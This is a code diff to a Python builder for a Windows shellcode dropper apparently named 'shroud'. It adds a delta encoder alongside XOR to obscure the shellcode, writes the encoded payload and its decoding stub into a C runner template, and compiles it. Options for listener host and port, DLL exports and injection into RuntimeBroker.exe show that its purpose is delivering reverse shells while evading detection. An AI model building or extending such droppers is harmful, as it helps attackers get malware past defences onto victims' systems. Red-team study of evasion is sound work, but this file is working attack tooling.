@@ -28,7 +28,7 @@ parser.add_argument('-L', '--lhost', help='Listener IP for templates.')
 parser.add_argument('-P', '--lport', help='Listener port for templates.')
 parser.add_argument('--export', help='Exported function name for DLL.')
 parser.add_argument('--process', help='Target process name for creation or remote injection. Default is RuntimeBroker.exe.')
-parser.add_argument('--xor', help='Use XOR encryption. Default is AES-256.', action="store_true")
+parser.add_argument('--xor', help='Use XOR encryption. Default is Red Siege\'s delta encoder.', action="store_true")
 parser.add_argument('--dont-encrypt', help='Don\'t encrypt the payload.', action="store_true")
 args = parser.parse_args()
 
@@ -58,6 +58,117 @@ def compile():
 		print("WIP1")
 	return
 
+def readShellcode(filePath):
+
+	shellcode = []
+
+	with open(filePath, "rb") as f:
+		byte = f.read(1)
+		while byte != b"":
+			shellcode.append(byte)
+			byte = f.read(1)
+
+	return shellcode
+
+def writePayload(shellcode, blob):
+
+	# Read in current runner
+	mainFileR = open("./setup/template.c", "r")
+	mainLines = mainFileR.readlines()
+	mainFileR.close()
+
+	
+	# Loop over lines and update payload / size
+	newLines = []
+	for line in mainLines:
+
+		# Update payload line
+		if "BYTE pPayload[]" in line and args.xor:
+			line = "\tBYTE pPayload[] = { "
+			for j in range(0,len(shellcode)):
+				if j != len(shellcode)-1:
+					line += f"0x{shellcode[j].to_bytes(1).hex()}, "
+				else:
+					line += f"0x{shellcode[j].to_bytes(1).hex()}" + " };\n"
+		elif "BYTE pPayload[]" in line and not args.xor:
+			line = "\n"
+		
+		# Update size line
+		if "SIZE_T sPayloadSize" in line and args.xor:
+			line = f"\tSIZE_T sPayloadSize = {len(shellcode)};\n"
+
+		newLines.append(line)
+
+	# Update decryption protocol
+	for i in range(0,len(newLines)):
+		if "SIZE_T sPayloadSize" in newLines[i]:
+			if args.xor:
+				newLines[i+1:i+1] = blob
+			else:
+				newLines[i+1:i+1] = blob
+
+	# Write to runner
+	with open("./src/main.c", mode="wt", encoding="utf-8") as mainFileW:
+		for line in newLines:
+			mainFileW.write(line)
+	
+	return
+
+def encryptDelta(shellcode):
+	# read in our raw shellcode and get the length
+	raw_sc = b''.join(shellcode)
+	sc_len = len(shellcode)
+
+	offset_arr = [] # stores the calculated offsets
+	remaining_idx = 1 # starts at 1 - second byte of shellcode
+	previous_byte = raw_sc[0] # Store previous byte we processed.
+
+	# Loop through remaining bytes of shellcode
+	while remaining_idx < sc_len:
+		# Subtract previous byte from current byte to get the offset
+		current_byte = raw_sc[remaining_idx] - previous_byte
+
+		# Add 256 if value is negative to wrap around.
+		if current_byte < 0:
+			current_byte = current_byte + 256
+
+		# Add current byte of offset array
+		offset_arr.append(current_byte)
+
+		# Update previous byte to current shellcode byte
+		previous_byte = raw_sc[remaining_idx]
+		remaining_idx += 1
+
+	return offset_arr, raw_sc, sc_len
+
+def deltaBlob(offset_arr,raw_sc,sc_len):
+
+	blob = '\tunsigned char first_byte = ' + hex(raw_sc[0]) + ';\n'
+	blob += '\tunsigned char delta[{}] = '.format(str(len(offset_arr))) + "{"
+	blob += '{}'.format(', '.join((hex(x) for x in offset_arr))) + " };\n"
+	blob += '\tunsigned char pPayload[{}] = '.format(str(sc_len)) + '{ 0x00 };\n'
+	blob += """\tunsigned int i, index;
+	int cap = sizeof(delta) / sizeof(delta[0]);
+	pPayload[0] = first_byte;
+	for (i = 0; i < cap; i++)
+	{
+		\tindex = i + 1;
+		\tpPayload[index] = pPayload[i] + delta[i];
+	}"""
+	
+	return blob
+
+def encryptXOR(shellcode):
+
+	key = os.urandom(32) # XOR KEY LENGTH!
+	byteString = b''.join(shellcode)
+	encrypted = bytes(a ^ b for a, b in zip(byteString, cycle(key)))
+	encList = []
+	for byte in encrypted:
+		encList.append(byte.to_bytes(1))
+
+	return encrypted, key
+
 def xorList(key):
 
 	keyLine = "\tBYTE pKey[] = { "
@@ -78,73 +189,6 @@ def xorList(key):
 	"""
 	return blob
 
-
-def readShellcode(filePath):
-
-	shellcode = []
-
-	with open(filePath, "rb") as f:
-		byte = f.read(1)
-		while byte != b"":
-			shellcode.append(byte)
-			byte = f.read(1)
-
-	return shellcode
-
-def writePayload(shellcode, key, iv=None):
-
-	# Read in current runner
-	mainFileR = open("./setup/template.c", "r")
-	mainLines = mainFileR.readlines()
-	mainFileR.close()
-	
-	# Loop over lines and update payload / size
-	newLines = []
-	for line in mainLines:
-
-		# Update payload line
-		if "BYTE pPayload[]" in line:
-			
-			line = "\tBYTE pPayload[] = { "
-			for j in range(0,len(shellcode)):
-				if j != len(shellcode)-1:
-					line += f"0x{shellcode[j].to_bytes(1).hex()}, "
-				else:
-					line += f"0x{shellcode[j].to_bytes(1).hex()}" + " };\n"
-		
-		# Update size line
-		if "SIZE_T sPayloadSize" in line:
-
-			line = f"\tSIZE_T sPayloadSize = {len(shellcode)};\n"
-
-		newLines.append(line)
-
-	# Update decryption protocol
-	for i in range(0,len(newLines)):
-		if "SIZE_T sPayloadSize" in newLines[i]:
-			if args.xor:
-				newLines[i+1:i+1] = xorList(key)
-
-	# Write to runner
-	with open("./src/main.c", mode="wt", encoding="utf-8") as mainFileW:
-		for line in newLines:
-			mainFileW.write(line)
-	
-	return
-
-
-def encryptXOR(shellcode):
-
-	key = os.urandom(32) # XOR KEY LENGTH!
-	byteString = b''.join(shellcode)
-	encrypted = bytes(a ^ b for a, b in zip(byteString, cycle(key)))
-	encList = []
-	for byte in encrypted:
-		encList.append(byte.to_bytes(1))
-
-	return encrypted, key
-
-
 def main():
 	# Generate templates if necessary
 	if args.msf or args.shell:
@@ -159,11 +203,14 @@ def main():
 	print("[~] Encrypting payload...")
 	if args.xor:
 		shellcode, key  = encryptXOR(shellcode)
+		writePayload(shellcode, xorList(key))
+	else:
+		offset_arr,raw_sc,sc_len = encryptDelta(shellcode)
+		writePayload(shellcode, deltaBlob(offset_arr,raw_sc,sc_len))
 
 
 	# Update dropper file wrapper (update payload, process name, export)
 	print("[~] Writing payload to dropper...")
-	writePayload(shellcode, key)
 
 	# Compile (x86_64-w64-mingw32-gcc -I/usr/share/mingw-w64/include ./src/* -o ./output/shroud.exe)
 	print("[~] Compiling...")
